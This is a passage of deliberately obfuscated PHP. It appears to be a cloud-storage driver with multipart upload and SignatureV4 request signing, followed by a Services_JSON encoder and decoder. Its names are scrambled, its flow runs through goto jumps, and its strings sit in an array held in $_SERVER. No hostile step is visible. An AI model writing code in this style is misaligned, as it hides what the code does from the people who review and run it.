$Fà‹Ô†¹ğÖ = $d˜…½èÙÆ[870]; goto b­ŠÆøğÈ; bé¢‡ß×¼‚: $aóˆ ´Ø× = array($this->accessKey, $BÎ÷¶İÇØ, $this->region, $eòõÇÍˆ«¡, $A¢ÆµÛâ¶); $cñ†°˜å‰î = implode($d˜…½èÙÆ[8], $aóˆ ´Ø×); $Dš‚Ûªˆç = array($d˜…½èÙÆ[842] => gmdate($d˜…½èÙÆ[841], strtotime($d˜…½èÙÆ[873])), $d˜…½èÙÆ[843] => array(array($d˜…½èÙÆ[845] => $this->bucket), array($d˜…½èÙÆ[844] => $e‚é…Ç²É°), array($d˜…½èÙÆ[846], $d˜…½èÙÆ[847], $d˜…½èÙÆ[33]), array($d˜…½èÙÆ[846], $d˜…½èÙÆ[874], $d˜…½èÙÆ[33]), array($d˜…½èÙÆ[846], $d˜…½èÙÆ[875], $d˜…½èÙÆ[33]), array($d˜…½èÙÆ[848] => $fŸ‘­æ±Œ), array($d˜…½èÙÆ[876] => $cñ†°˜å‰î), array($d˜…½èÙÆ[877] => $Fà‹Ô†¹ğÖ), array($d˜…½èÙÆ[878] => $bõ÷¥Â³ÅŒ), array($d˜…½èÙÆ[879] => $E¤ç¦–ò–•))); goto B®ìğ…ëˆ¬; b­ŠÆøğÈ: $eòõÇÍˆ«¡ = $d˜…½èÙÆ[59]; $bõ÷¥Â³ÅŒ = gmdate($d˜…½èÙÆ[871]); $BÎ÷¶İÇØ = gmdate($d˜…½èÙÆ[448]); goto EŸ÷‡‚¸ã½; BÄˆµÑ‰„: } public function multiUploadFormData($E¯§­¥½˜¨, $cŠó³î„‰ = 3600) { $Dë†³ÕØ» =& $_SERVER[İë¬“ÅÒÛ›]; $eÛˆªÅÏê = gmdate($Dë†³ÕØ»[972]); $ağ¢¨¦¥‰ = array(); $e’¬…‰é¬† = $this->client->getUploadId($this->bucket, $E¯§­¥½˜¨, $ağ¢¨¦¥‰); if (!$e’¬…‰é¬†) { return !1; } return array($Dë†³ÕØ»[216] => $e’¬…‰é¬†, $Dë†³ÕØ»[166] => $this->getHost() . $Dë†³ÕØ»[8] . $this->pathEncode($E¯§­¥½˜¨), $Dë†³ÕØ»[217] => $eÛˆªÅÏê, $Dë†³ÕØ»[88] => $E¯§­¥½˜¨); } public function multiUploadAuthData($D°ƒö†ÛÅŞ, $AôêÖ¨  ø = array()) { goto Fö“–æö ; FËñîÕ•‰Ø: unset($AôêÖ¨  ø[$fÀî”¿œ»[88]]); if (isset($AôêÖ¨  ø[$fÀî”¿œ»[218]])) { return $this->listUploadParts($BáòÚ÷°«›, $AôêÖ¨  ø); } $AòªŸîº¿õ = array(); goto fä¯Ê–‚¯œ; Eïá‰‹í–: if (strpos($Dééèº·é¸, $fÀî”¿œ»[220]) === 0) { if (isset($AòªŸîº¿õ[$fÀî”¿œ»[974]])) { $a·¯ŞöÓîÑ = $AòªŸîº¿õ[$fÀî”¿œ»[974]]; } else { if (isset($aéØÓ§„ª[$fÀî”¿œ»[974]])) { $a·¯ŞöÓîÑ = $aéØÓ§„ª[$fÀî”¿œ»[974]]; } else { $a·¯ŞöÓîÑ = hash($fÀî”¿œ»[880], $fÀî”¿œ»[33]); } } return array($fÀî”¿œ»[227] => $aéØÓ§„ª[$fÀî”¿œ»[227]], $fÀî”¿œ»[974] => $a·¯ŞöÓîÑ, $fÀî”¿œ»[217] => $aéØÓ§„ª[$fÀî”¿œ»[977]]); } return $aéØÓ§„ª[$fÀî”¿œ»[227]]; goto F„òÅ×Ú¯í; a»àª…•ó : $aÓ¹±‘‘™ = $fÀî”¿œ»[221]; $fÅ§ã¯šÕÖ = $fÀî”¿œ»[8] . $this->pathEncode($BáòÚ÷°«›) . $Dééèº·é¸; $aéØÓ§„ª = $this->client->__getSignatureV4($AòªŸîº¿õ, $e¨”á¬ì¾, $aÓ¹±‘‘™, $fÅ§ã¯šÕÖ); goto Eïá‰‹í–; Fö“–æö : $fÀî”¿œ» =& $_SERVER[İë¬“ÅÒÛ›]; $Dééèº·é¸ = isset($AôêÖ¨  ø[$fÀî”¿œ»[157]]) ? $AôêÖ¨  ø[$fÀî”¿œ»[157]] : $fÀî”¿œ»[33]; $BáòÚ÷°«› = $AôêÖ¨  ø[$fÀî”¿œ»[88]]; goto FËñîÕ•‰Ø; fä¯Ê–‚¯œ: if (isset($AôêÖ¨  ø[$fÀî”¿œ»[973]])) { $AòªŸîº¿õ[$fÀî”¿œ»[974]] = $AôêÖ¨  ø[$fÀî”¿œ»[973]]; } $b¸‰´›Ô¬ = explode($fÀî”¿œ»[168], $this->getHost()); $e¨”á¬ì¾ = array($fÀî”¿œ»[975] => $b¸‰´›Ô¬[1], $fÀî”¿œ»[976] => $fÀî”¿œ»[33], $fÀî”¿œ»[199] => $fÀî”¿œ»[115], $fÀî”¿œ»[882] => $AôêÖ¨  ø[$fÀî”¿œ»[78]]); goto a»àª…•ó ; F„òÅ×Ú¯í: } public function listUploadParts($aåªáË±, $dĞÈ‚©¿ÙÔ = array()) { goto A Ú÷è›¼¾; fã¼Ò“âí³: if (!$F¨»‹Ô‹´ğ) { return !1; } $aÁË’Ÿ—ğò = $e®²íÓÆ¨›[978]; foreach ($F¨»‹Ô‹´ğ as $Aš„ŠïÂŸè) { $aÁË’Ÿ—ğò .= $e®²íÓÆ¨›[979] . "\74\120\x61\x72\164\x4e\x75\x6d\142\145\162\x3e{$Aš„ŠïÂŸè[$e®²íÓÆ¨›[925]]}\74\x2f\120\x61\162\x74\x4e\165\155\x62\145\162\x3e\xa" . "\x3c\x45\124\141\147\76{$Aš„ŠïÂŸè[$e®²íÓÆ¨›[926]]}\x3c\57\105\x54\x61\x67\76\12" . $e®²íÓÆ¨›[980]; } goto B£Ÿ¡¨ŸÀà; A Ú÷è›¼¾: $e®²íÓÆ¨› =& $_SERVER[İë¬“ÅÒÛ›]; $E£¾ÌºßÆ¾ = str_replace($e®²íÓÆ¨›[228], $e®²íÓÆ¨›[33], $dĞÈ‚©¿ÙÔ[$e®²íÓÆ¨›[157]]); $F¨»‹Ô‹´ğ = $this->client->listParts($this->bucket, $aåªáË±, $E£¾ÌºßÆ¾); goto fã¼Ò“âí³; A‡œëåÖ‘Í: $c’Úçœ æŠ = array($e®²íÓÆ¨›[975] => $CĞœœ„Ş×¿[1], $e®²íÓÆ¨›[199] => $e®²íÓÆ¨›[115], $e®²íÓÆ¨›[882] => strlen($aÁË’Ÿ—ğò)); $dŒ³ãƒ«‘ = $e®²íÓÆ¨›[219]; $bå…í™ˆòÁ = $e®²íÓÆ¨›[8] . $this->pathEncode($aåªáË±) . $dĞÈ‚©¿ÙÔ[$e®²íÓÆ¨›[157]]; goto EÓ­ÕïÁà¯; EÓ­ÕïÁà¯: $dÒ‡ŠÂ¦¾ = $this->client->__getSignatureV4($c”“‘š„Ô™, $c’Úçœ æŠ, $dŒ³ãƒ«‘, $bå…í™ˆòÁ, $aÁË’Ÿ—ğò); return array($e®²íÓÆ¨›[227] => $dÒ‡ŠÂ¦¾[$e®²íÓÆ¨›[227]], $e®²íÓÆ¨›[217] => $dÒ‡ŠÂ¦¾[$e®²íÓÆ¨›[977]], $e®²íÓÆ¨›[229] => $F¨»‹Ô‹´ğ, $e®²íÓÆ¨›[974] => $dÒ‡ŠÂ¦¾[$e®²íÓÆ¨›[974]]); goto F›ïæ¶ª«³; B£Ÿ¡¨ŸÀà: $aÁË’Ÿ—ğò .= $e®²íÓÆ¨›[981]; $c”“‘š„Ô™ = array(); $CĞœœ„Ş×¿ = explode($e®²íÓÆ¨›[168], $this->getHost()); goto A‡œëåÖ‘Í; F›ïæ¶ª«³: } public function link($fŠÔÂ‘İñÉ, $f÷õàÏº² = array()) { return parent::link($fŠÔÂ‘İñÉ, $f÷õàÏº²); } public function fileOut($E†…Úà¤ç¸, $bš‡Á¤·à¸ = false, $C°‹Šæ– = false, $eãğä†ìÂ· = '') { if (strstr($this->endpoint, $_SERVER[İë¬“ÅÒÛ›][982])) { return parent::fileOutServer($E†…Úà¤ç¸, $bš‡Á¤·à¸, $C°‹Šæ–, $eãğä†ìÂ·); } parent::fileOut($E†…Úà¤ç¸, $bš‡Á¤·à¸, $C°‹Šæ–, $eãğä†ìÂ·); } public function fileOutImage($E†öíÉ¨¶œ, $e®‹§È‡… = 250) { if (strstr($this->endpoint, $_SERVER[İë¬“ÅÒÛ›][982])) { return parent::fileOutImageServer($E†öíÉ¨¶œ, $e®‹§È‡…); } parent::fileOutImage($E†öíÉ¨¶œ, $e®‹§È‡…); } public function fileInfoImage($EÕÑ†î£®À, &$FÛÄÂ§Ö‘£) { $f’µÒğÈ =& $_SERVER[İë¬“ÅÒÛ›]; $eõÖƒ‹¤Ùä = array($f’µÒğÈ[208], $f’µÒğÈ[158], $f’µÒğÈ[209], $f’µÒğÈ[210], $f’µÒğÈ[211]); if (!in_array($FÛÄÂ§Ö‘£[$f’µÒğÈ[157]], $eõÖƒ‹¤Ùä)) { return; } if (!strstr($this->endpoint, $f’µÒğÈ[982])) { $d¿¤¤ˆ” = $this->link($EÕÑ†î£®À); $aÖ¿Ôèµ›§ = getimagesize($d¿¤¤ˆ”); if ($aÖ¿Ôèµ›§) { $FÛÄÂ§Ö‘£[$f’µÒğÈ[212]] = array($f’µÒğÈ[213] => $aÖ¿Ôèµ›§[0], $f’µÒğÈ[214] => $aÖ¿Ôèµ›§[1]); } } } public function getHost() { $aœ‹‰†ãİİ =& $_SERVER[İë¬“ÅÒÛ›]; $c®ôÈ±Æ„ = rtrim(parent::getHost(), $aœ‹‰†ãİİ[8] . $this->bucket); $c®ôÈ±Æ„ = explode($aœ‹‰†ãİİ[168], $c®ôÈ±Æ„); return $c®ôÈ±Æ„[0] . $aœ‹‰†ãİİ[168] . $this->bucket . $aœ‹‰†ãİİ[92] . $c®ôÈ±Æ„[1]; } } goto c¸õ—‚‘ƒœ; E­îëÒÔ‡: define($_SERVER[İë¬“ÅÒÛ›][1368], 32); class Services_JSON { function __construct($b÷Äµ¿‘âŞ = 0) { $this->use = $b÷Äµ¿‘âŞ; } function utf162utf8($CœÄ÷—À­) { $dõèƒÍó‘ë =& $_SERVER[İë¬“ÅÒÛ›]; if (function_exists($dõèƒÍó‘ë[69])) { return mb_convert_encoding($CœÄ÷—À­, $dõèƒÍó‘ë[1369], $dõèƒÍó‘ë[1370]); } $aÛÚÈ¸ËÕ‰ = ord($CœÄ÷—À­[0]) << 8 | ord($CœÄ÷—À­[1]); switch (!0) { case (127 & $aÛÚÈ¸ËÕ‰) == $aÛÚÈ¸ËÕ‰: return chr(127 & $aÛÚÈ¸ËÕ‰); case (2047 & $aÛÚÈ¸ËÕ‰) == $aÛÚÈ¸ËÕ‰: return chr(192 | $aÛÚÈ¸ËÕ‰ >> 6 & 31) . chr(128 | $aÛÚÈ¸ËÕ‰ & 63); case (65535 & $aÛÚÈ¸ËÕ‰) == $aÛÚÈ¸ËÕ‰: return chr(224 | $aÛÚÈ¸ËÕ‰ >> 12 & 15) . chr(128 | $aÛÚÈ¸ËÕ‰ >> 6 & 63) . chr(128 | $aÛÚÈ¸ËÕ‰ & 63); } return $dõèƒÍó‘ë[33]; } function utf82utf16($dã¾¡œ™•®) { $B–äøéø—Ö =& $_SERVER[İë¬“ÅÒÛ›]; if (function_exists($B–äøéø—Ö[69])) { return mb_convert_encoding($dã¾¡œ™•®, $B–äøéø—Ö[1370], $B–äøéø—Ö[1369]); } switch (strlen($dã¾¡œ™•®)) { case 1: return $dã¾¡œ™•®; case 2: return chr(7 & ord($dã¾¡œ™•®[0]) >> 2) . chr(192 & ord($dã¾¡œ™•®[0]) << 6 | 63 & ord($dã¾¡œ™•®[1])); case 3: return chr(240 & ord($dã¾¡œ™•®[0]) << 4 | 15 & ord($dã¾¡œ™•®[1]) >> 2) . chr(192 & ord($dã¾¡œ™•®[1]) << 6 | 127 & ord($dã¾¡œ™•®[2])); } return $B–äøéø—Ö[33]; } function encode($b¯¾©Í¨Ñª) { $CÃ§µµÆ®ª =& $_SERVER[İë¬“ÅÒÛ›]; switch (gettype($b¯¾©Í¨Ñª)) { case $CÃ§µµÆ®ª[1371]: return $b¯¾©Í¨Ñª ? $CÃ§µµÆ®ª[1372] : $CÃ§µµÆ®ª[1373]; case $CÃ§µµÆ®ª[1374]: return $CÃ§µµÆ®ª[100]; case $CÃ§µµÆ®ª[307]: return (int) $b¯¾©Í¨Ñª; case $CÃ§µµÆ®ª[282]: case $CÃ§µµÆ®ª[281]: return (double) $b¯¾©Í¨Ñª; case $CÃ§µµÆ®ª[316]: $E¥³ëïö¢ = $CÃ§µµÆ®ª[33]; $dÃ‰Ùò‚ = strlen($b¯¾©Í¨Ñª); for ($e•ÏîˆÒÎê = 0; $e•ÏîˆÒÎê < $dÃ‰Ùò‚; ++$e•ÏîˆÒÎê) { $CÎÈ†ï¶‡‘ = ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê]); switch (!0) { case $CÎÈ†ï¶‡‘ == 8: $E¥³ëïö¢ .= $CÃ§µµÆ®ª[1375]; break; case $CÎÈ†ï¶‡‘ == 9: $E¥³ëïö¢ .= $CÃ§µµÆ®ª[1376]; break; case $CÎÈ†ï¶‡‘ == 10: $E¥³ëïö¢ .= $CÃ§µµÆ®ª[1377]; break; case $CÎÈ†ï¶‡‘ == 12: $E¥³ëïö¢ .= $CÃ§µµÆ®ª[1378]; break; case $CÎÈ†ï¶‡‘ == 13: $E¥³ëïö¢ .= $CÃ§µµÆ®ª[1379]; break; case $CÎÈ†ï¶‡‘ == 34: case $CÎÈ†ï¶‡‘ == 47: case $CÎÈ†ï¶‡‘ == 92: $E¥³ëïö¢ .= $CÃ§µµÆ®ª[94] . $b¯¾©Í¨Ñª[$e•ÏîˆÒÎê]; break; case $CÎÈ†ï¶‡‘ >= 32 && $CÎÈ†ï¶‡‘ <= 127: $E¥³ëïö¢ .= $b¯¾©Í¨Ñª[$e•ÏîˆÒÎê]; break; case ($CÎÈ†ï¶‡‘ & 224) == 192: $Bğ²Î•íà = pack($CÃ§µµÆ®ª[1380], $CÎÈ†ï¶‡‘, ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 1])); $e•ÏîˆÒÎê += 1; $Fßª²‘„éØ = $this->utf82utf16($Bğ²Î•íà); $E¥³ëïö¢ .= sprintf($CÃ§µµÆ®ª[1381], bin2hex($Fßª²‘„éØ)); break; case ($CÎÈ†ï¶‡‘ & 240) == 224: $Bğ²Î•íà = pack($CÃ§µµÆ®ª[1380], $CÎÈ†ï¶‡‘, ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 1]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 2])); $e•ÏîˆÒÎê += 2; $Fßª²‘„éØ = $this->utf82utf16($Bğ²Î•íà); $E¥³ëïö¢ .= sprintf($CÃ§µµÆ®ª[1381], bin2hex($Fßª²‘„éØ)); break; case ($CÎÈ†ï¶‡‘ & 248) == 240: $Bğ²Î•íà = pack($CÃ§µµÆ®ª[1380], $CÎÈ†ï¶‡‘, ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 1]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 2]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 3])); $e•ÏîˆÒÎê += 3; $Fßª²‘„éØ = $this->utf82utf16($Bğ²Î•íà); $E¥³ëïö¢ .= sprintf($CÃ§µµÆ®ª[1381], bin2hex($Fßª²‘„éØ)); break; case ($CÎÈ†ï¶‡‘ & 252) == 248: $Bğ²Î•íà = pack($CÃ§µµÆ®ª[1380], $CÎÈ†ï¶‡‘, ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 1]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 2]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 3]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 4])); $e•ÏîˆÒÎê += 4; $Fßª²‘„éØ = $this->utf82utf16($Bğ²Î•íà); $E¥³ëïö¢ .= sprintf($CÃ§µµÆ®ª[1381], bin2hex($Fßª²‘„éØ)); break; case ($CÎÈ†ï¶‡‘ & 254) == 252: $Bğ²Î•íà = pack($CÃ§µµÆ®ª[1380], $CÎÈ†ï¶‡‘, ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 1]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 2]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 3]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 4]), ord($b¯¾©Í¨Ñª[$e•ÏîˆÒÎê + 5])); $e•ÏîˆÒÎê += 5; $Fßª²‘„éØ = $this->utf82utf16($Bğ²Î•íà); $E¥³ëïö¢ .= sprintf($CÃ§µµÆ®ª[1381], bin2hex($Fßª²‘„éØ)); break; } } return $CÃ§µµÆ®ª[112] . $E¥³ëïö¢ . $CÃ§µµÆ®ª[112]; case $CÃ§µµÆ®ª[1382]: if (is_array($b¯¾©Í¨Ñª) && count($b¯¾©Í¨Ñª) && array_keys($b¯¾©Í¨Ñª) !== range(0, sizeof($b¯¾©Í¨Ñª) - 1)) { $eåÊ¨§ÂÜ = array_map(array($this, $CÃ§µµÆ®ª[1383]), array_keys($b¯¾©Í¨Ñª), array_values($b¯¾©Í¨Ñª)); foreach ($eåÊ¨§ÂÜ as $cùêÉ¹¯„) { if (Services_JSON::isError($cùêÉ¹¯„)) { return $cùêÉ¹¯„; } } return $CÃ§µµÆ®ª[818] . join($CÃ§µµÆ®ª[47], $eåÊ¨§ÂÜ) . $CÃ§µµÆ®ª[319]; } $eÉË”ÃøÏ = array_map(array($this, $CÃ§µµÆ®ª[1384]), $b¯¾©Í¨Ñª); foreach ($eÉË”ÃøÏ as $A²åã’’× ) { if (Services_JSON::isError($A²åã’’× )) { return $A²åã’’× ; } } return $CÃ§µµÆ®ª[154] . join($CÃ§µµÆ®ª[47], $eÉË”ÃøÏ) . $CÃ§µµÆ®ª[516]; case $CÃ§µµÆ®ª[1385]: $Aá£œêÇ‰ = get_object_vars($b¯¾©Í¨Ñª); $eåÊ¨§ÂÜ = array_map(array($this, $CÃ§µµÆ®ª[1383]), array_keys($Aá£œêÇ‰), array_values($Aá£œêÇ‰)); foreach ($eåÊ¨§ÂÜ as $cùêÉ¹¯„) { if (Services_JSON::isError($cùêÉ¹¯„)) { return $cùêÉ¹¯„; } } return $CÃ§µµÆ®ª[818] . join($CÃ§µµÆ®ª[47], $eåÊ¨§ÂÜ) . $CÃ§µµÆ®ª[319]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $CÃ§µµÆ®ª[100] : new Services_JSON_Error(gettype($b¯¾©Í¨Ñª) . $CÃ§µµÆ®ª[1386]); } } function name_value($DÈ¢Ïº×§, $FÖÓ›±µÕŠ) { $díƒÆ’Æ«ß = $this->encode($FÖÓ›±µÕŠ); if (Services_JSON::isError($díƒÆ’Æ«ß)) { return $díƒÆ’Æ«ß; } return $this->encode(strval($DÈ¢Ïº×§)) . $_SERVER[İë¬“ÅÒÛ›][4] . $díƒÆ’Æ«ß; } function reduce_string($bå¿Ä‹‚µ”) { $b“®šª£¥á =& $_SERVER[İë¬“ÅÒÛ›]; $bå¿Ä‹‚µ” = preg_replace(array($b“®šª£¥á[1387], $b“®šª£¥á[1388], $b“®šª£¥á[1389]), $b“®šª£¥á[33], $bå¿Ä‹‚µ”); return trim($bå¿Ä‹‚µ”); } function decode($a‘Ø²ÍÒÓ½) { $bÉŠÚ™´¹§ =& $_SERVER[İë¬“ÅÒÛ›]; $a‘Ø²ÍÒÓ½ = $this->reduce_string($a‘Ø²ÍÒÓ½); switch (strtolower($a‘Ø²ÍÒÓ½)) { case $bÉŠÚ™´¹§[1372]: return !0; case $bÉŠÚ™´¹§[1373]: return !1; case $bÉŠÚ™´¹§[100]: return null; default: $d›”Öƒå¢´ = array(); if (is_numeric($a‘Ø²ÍÒÓ½)) { return (double) $a‘Ø²ÍÒÓ½ == (int) $a‘Ø²ÍÒÓ½ ? (int) $a‘Ø²ÍÒÓ½ : (double) $a‘Ø²ÍÒÓ½; } elseif (preg_match($bÉŠÚ™´¹§[1390], $a‘Ø²ÍÒÓ½, $d›”Öƒå¢´) && $d›”Öƒå¢´[1] == $d›”Öƒå¢´[2]) { $bÂîÂ˜äš = substr($a‘Ø²ÍÒÓ½, 0, 1); $a‰ÇÑ•ù¨¨ = substr($a‘Ø²ÍÒÓ½, 1, -1); $bÁÜøÃ¯ğ£ = $bÉŠÚ™´¹§[33]; $A°Æ“ „á = strlen($a‰ÇÑ•ù¨¨); for ($dë÷–‘•á× = 0; $dë÷–‘•á× < $A°Æ“ „á; ++$dë÷–‘•á×) { $c„¥ºÊòô¤ = substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 2); $BïÃŒøò©Â = ord($a‰ÇÑ•ù¨¨[$dë÷–‘•á×]); switch (!0) { case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1375]: $bÁÜøÃ¯ğ£ .= chr(8); ++$dë÷–‘•á×; break; case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1376]: $bÁÜøÃ¯ğ£ .= chr(9); ++$dë÷–‘•á×; break; case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1377]: $bÁÜøÃ¯ğ£ .= chr(10); ++$dë÷–‘•á×; break; case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1378]: $bÁÜøÃ¯ğ£ .= chr(12); ++$dë÷–‘•á×; break; case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1379]: $bÁÜøÃ¯ğ£ .= chr(13); ++$dë÷–‘•á×; break; case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1016]: case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1391]: case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1392]: case $c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1393]: if ($bÂîÂ˜äš == $bÉŠÚ™´¹§[112] && $c„¥ºÊòô¤ != $bÉŠÚ™´¹§[1391] || $bÂîÂ˜äš == $bÉŠÚ™´¹§[55] && $c„¥ºÊòô¤ != $bÉŠÚ™´¹§[1016]) { $bÁÜøÃ¯ğ£ .= $a‰ÇÑ•ù¨¨[++$dë÷–‘•á×]; } break; case preg_match($bÉŠÚ™´¹§[1394], substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 6)): $F“Æ…Ã¹ = chr(hexdec(substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á× + 2, 2))) . chr(hexdec(substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á× + 4, 2))); $bÁÜøÃ¯ğ£ .= $this->utf162utf8($F“Æ…Ã¹); $dë÷–‘•á× += 5; break; case $BïÃŒøò©Â >= 32 && $BïÃŒøò©Â <= 127: $bÁÜøÃ¯ğ£ .= $a‰ÇÑ•ù¨¨[$dë÷–‘•á×]; break; case ($BïÃŒøò©Â & 224) == 192: $bÁÜøÃ¯ğ£ .= substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 2); ++$dë÷–‘•á×; break; case ($BïÃŒøò©Â & 240) == 224: $bÁÜøÃ¯ğ£ .= substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 3); $dë÷–‘•á× += 2; break; case ($BïÃŒøò©Â & 248) == 240: $bÁÜøÃ¯ğ£ .= substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 4); $dë÷–‘•á× += 3; break; case ($BïÃŒøò©Â & 252) == 248: $bÁÜøÃ¯ğ£ .= substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 5); $dë÷–‘•á× += 4; break; case ($BïÃŒøò©Â & 254) == 252: $bÁÜøÃ¯ğ£ .= substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 6); $dë÷–‘•á× += 5; break; } } return $bÁÜøÃ¯ğ£; } elseif (preg_match($bÉŠÚ™´¹§[1395], $a‘Ø²ÍÒÓ½) || preg_match($bÉŠÚ™´¹§[1396], $a‘Ø²ÍÒÓ½)) { goto a¶·ñ¸´‘; a¶·ñ¸´‘: if ($a‘Ø²ÍÒÓ½[0] == $bÉŠÚ™´¹§[154]) { $f””„À¾Á¦ = array(SERVICES_JSON_IN_ARR); $bçºØ”ÒÖ¥ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f””„À¾Á¦ = array(SERVICES_JSON_IN_OBJ); $Cñº—©ÎÈ½ = array(); } else { $f””„À¾Á¦ = array(SERVICES_JSON_IN_OBJ); $Cñº—©ÎÈ½ = new stdClass(); } } array_push($f””„À¾Á¦, array($bÉŠÚ™´¹§[1397] => SERVICES_JSON_SLICE, $bÉŠÚ™´¹§[267] => 0, $bÉŠÚ™´¹§[1398] => !1)); $a‰ÇÑ•ù¨¨ = substr($a‘Ø²ÍÒÓ½, 1, -1); goto f×º³‘Èë; aÑ…êé³òó: for ($dë÷–‘•á× = 0; $dë÷–‘•á× <= $A°Æ“ „á; ++$dë÷–‘•á×) { $féö«ë§Õµ = end($f””„À¾Á¦); $c„¥ºÊòô¤ = substr($a‰ÇÑ•ù¨¨, $dë÷–‘•á×, 2); if ($dë÷–‘•á× == $A°Æ“ „á || $a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[47] && $féö«ë§Õµ[$bÉŠÚ™´¹§[1397]] == SERVICES_JSON_SLICE) { $a’÷Œ²ÄÉ“ = substr($a‰ÇÑ•ù¨¨, $féö«ë§Õµ[$bÉŠÚ™´¹§[267]], $dë÷–‘•á× - $féö«ë§Õµ[$bÉŠÚ™´¹§[267]]); array_push($f””„À¾Á¦, array($bÉŠÚ™´¹§[1397] => SERVICES_JSON_SLICE, $bÉŠÚ™´¹§[267] => $dë÷–‘•á× + 1, $bÉŠÚ™´¹§[1398] => !1)); if (reset($f””„À¾Á¦) == SERVICES_JSON_IN_ARR) { array_push($bçºØ”ÒÖ¥, $this->decode($a’÷Œ²ÄÉ“)); } elseif (reset($f””„À¾Á¦) == SERVICES_JSON_IN_OBJ) { $D»ÔŠâ‡Êˆ = array(); if (preg_match($bÉŠÚ™´¹§[1399], $a’÷Œ²ÄÉ“, $D»ÔŠâ‡Êˆ)) { $fšÄìæÂá× = $this->decode($D»ÔŠâ‡Êˆ[1]); $d»ôİÉ® ¿ = $this->decode($D»ÔŠâ‡Êˆ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cñº—©ÎÈ½[$fšÄìæÂá×] = $d»ôİÉ® ¿; } else { $Cñº—©ÎÈ½->{$fšÄìæÂá×} = $d»ôİÉ® ¿; } } elseif (preg_match($bÉŠÚ™´¹§[1400], $a’÷Œ²ÄÉ“, $D»ÔŠâ‡Êˆ)) { $fšÄìæÂá× = $D»ÔŠâ‡Êˆ[1]; $d»ôİÉ® ¿ = $this->decode($D»ÔŠâ‡Êˆ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cñº—©ÎÈ½[$fšÄìæÂá×] = $d»ôİÉ® ¿; } else { $Cñº—©ÎÈ½->{$fšÄìæÂá×} = $d»ôİÉ® ¿; } } } } elseif (($a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[112] || $a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[55]) && $féö«ë§Õµ[$bÉŠÚ™´¹§[1397]] != SERVICES_JSON_IN_STR) { array_push($f””„À¾Á¦, array($bÉŠÚ™´¹§[1397] => SERVICES_JSON_IN_STR, $bÉŠÚ™´¹§[267] => $dë÷–‘•á×, $bÉŠÚ™´¹§[1398] => $a‰ÇÑ•ù¨¨[$dë÷–‘•á×])); } elseif ($a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $féö«ë§Õµ[$bÉŠÚ™´¹§[1398]] && $féö«ë§Õµ[$bÉŠÚ™´¹§[1397]] == SERVICES_JSON_IN_STR && (strlen(substr($a‰ÇÑ•ù¨¨, 0, $dë÷–‘•á×)) - strlen(rtrim(substr($a‰ÇÑ•ù¨¨, 0, $dë÷–‘•á×), $bÉŠÚ™´¹§[94]))) % 2 != 1) { array_pop($f””„À¾Á¦); } elseif ($a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[154] && in_array($féö«ë§Õµ[$bÉŠÚ™´¹§[1397]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f””„À¾Á¦, array($bÉŠÚ™´¹§[1397] => SERVICES_JSON_IN_ARR, $bÉŠÚ™´¹§[267] => $dë÷–‘•á×, $bÉŠÚ™´¹§[1398] => !1)); } elseif ($a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[516] && $féö«ë§Õµ[$bÉŠÚ™´¹§[1397]] == SERVICES_JSON_IN_ARR) { array_pop($f””„À¾Á¦); } elseif ($a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[818] && in_array($féö«ë§Õµ[$bÉŠÚ™´¹§[1397]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f””„À¾Á¦, array($bÉŠÚ™´¹§[1397] => SERVICES_JSON_IN_OBJ, $bÉŠÚ™´¹§[267] => $dë÷–‘•á×, $bÉŠÚ™´¹§[1398] => !1)); } elseif ($a‰ÇÑ•ù¨¨[$dë÷–‘•á×] == $bÉŠÚ™´¹§[319] && $féö«ë§Õµ[$bÉŠÚ™´¹§[1397]] == SERVICES_JSON_IN_OBJ) { array_pop($f””„À¾Á¦); } elseif 